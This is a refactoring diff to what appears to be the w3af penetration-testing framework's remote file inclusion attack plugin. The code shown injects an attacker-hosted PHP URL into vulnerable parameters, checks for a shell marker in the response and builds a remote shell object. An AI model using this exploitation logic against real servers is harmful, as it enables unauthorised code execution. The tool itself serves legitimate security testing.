@@ -36,15 +36,16 @@ from core.controllers.w3afException import w3afException
 from core.controllers.daemons.webserver import webserver
 from core.controllers.misc.homeDir import get_home_dir
 
-import os
-import time
-
 # Advanced shell stuff
 from core.data.kb.shell import shell as shell
 import plugins.attack.webshells.getShell as getShell
 
 # Port definition
 import core.data.constants.w3afPorts as w3afPorts
+
+import os
+import time
+
 
 class remoteFileIncludeShell(baseAttackPlugin):
     '''
@@ -59,6 +60,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
         self._shell = None
         self._web_server = None
         self._xss_vuln = None
+        self._exploit_dc = None
         
         # User configured variables
         self._listen_port = w3afPorts.REMOTEFILEINCLUDE
@@ -106,11 +108,11 @@ class remoteFileIncludeShell(baseAttackPlugin):
                         
                         # Test if the current xss vuln works for us:
                         function_reference = getattr( self._urlOpener , xss_vuln.getMethod() )
-                        dc = xss_vuln.getDc()
-                        dc[ xss_vuln.getVar() ] = test_string
+                        data_container = xss_vuln.getDc()
+                        data_container[ xss_vuln.getVar() ] = test_string
 
                         try:
-                            http_res = function_reference( xss_vuln.getURL(), str(dc) )
+                            http_res = function_reference( xss_vuln.getURL(), str(data_container) )
                         except:
                             continue
                         else:
@@ -153,19 +155,20 @@ class remoteFileIncludeShell(baseAttackPlugin):
         '''
         return 'remoteFileInclude'
         
-    def _generateShell( self, vuln ):
+    def _generateShell( self, vuln_obj ):
         '''
+        @parameter vuln_obj: The vuln to exploit.
         @return: A shell object based on the vuln that is passed as parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verifyVuln( vuln ):
+        if self._verifyVuln( vuln_obj ):
             # Create the shell object
-            s = rfi_shell( vuln )
-            s.setUrlOpener( self._urlOpener )
-            s.setCut( self._header, self._footer )
-            s.setWebServer( self._web_server )
-            s.setExploitDc( self._exploit_dc )
-            return s
+            shell_obj = rfi_shell( vuln_obj )
+            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setCut( self._header, self._footer )
+            shell_obj.setWebServer( self._web_server )
+            shell_obj.setExploitDc( self._exploit_dc )
+            return shell_obj
         else:
             return None
 
@@ -191,11 +194,11 @@ class remoteFileIncludeShell(baseAttackPlugin):
             
             # Prepare for exploitation...
             function_reference = getattr( self._urlOpener , vuln.getMethod() )
-            dc = vuln.getDc()
-            dc[ vuln.getVar() ] = url_to_include
+            data_container = vuln.getDc()
+            data_container[ vuln.getVar() ] = url_to_include
 
             try:
-                http_res = function_reference( vuln.getURL(), str(dc) )
+                http_res = function_reference( vuln.getURL(), str(data_container) )
             except:
                 successfully_exploited = False
             else:
@@ -203,7 +206,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
                                                         getShell.SHELL_IDENTIFIER, exact=True )
 
             if successfully_exploited:
-                self._exploit_dc = dc
+                self._exploit_dc = data_container
                 return successfully_exploited
             else:
                 # Remove the file from the local webserver webroot
@@ -218,18 +221,18 @@ class remoteFileIncludeShell(baseAttackPlugin):
         '''
         if self._use_XSS_vuln:
             url = urlParser.uri2url( self._xss_vuln.getURL() )
-            dc = self._xss_vuln.getDc()
-            dc = dc.copy()
-            dc[ self._xss_vuln.getVar() ] = file_content
-            url_to_include = url + '?' + str(dc)
+            data_container = self._xss_vuln.getDc()
+            data_container = data_container.copy()
+            data_container[ self._xss_vuln.getVar() ] = file_content
+            url_to_include = url + '?' + str(data_container)
             return url_to_include
         else:
             # Write the php to the webroot
             filename = createRandAlNum()
             try:
-                f = open( os.path.join(get_home_dir(), 'webroot', filename ) , 'w')
-                f.write( file_content )
-                f.close()
+                file_handler = open( os.path.join(get_home_dir(), 'webroot', filename ) , 'w')
+                file_handler.write( file_content )
+                file_handler.close()
             except:
                 raise w3afException('Could not create file in webroot.')
             else:
